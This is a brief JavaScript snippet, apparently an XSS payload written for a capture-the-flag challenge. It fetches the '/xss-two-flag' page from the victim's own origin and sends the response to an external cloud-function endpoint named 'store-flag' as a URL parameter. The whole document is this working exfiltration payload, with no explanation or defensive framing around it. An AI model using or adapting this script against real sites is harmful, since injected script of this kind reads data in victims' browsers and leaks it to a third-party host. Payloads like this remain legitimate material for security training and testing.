var xhr = new XMLHttpRequest();
xhr.open('GET',location.origin + '/xss-two-flag',true);
xhr.onload = function () {
var request = new XMLHttpRequest();
request.open('GET','https://us-west1-corgi-test.cloudfunctions.net/store-flag?flag=' + xhr.responseText,true);
request.send()};
xhr.send(null);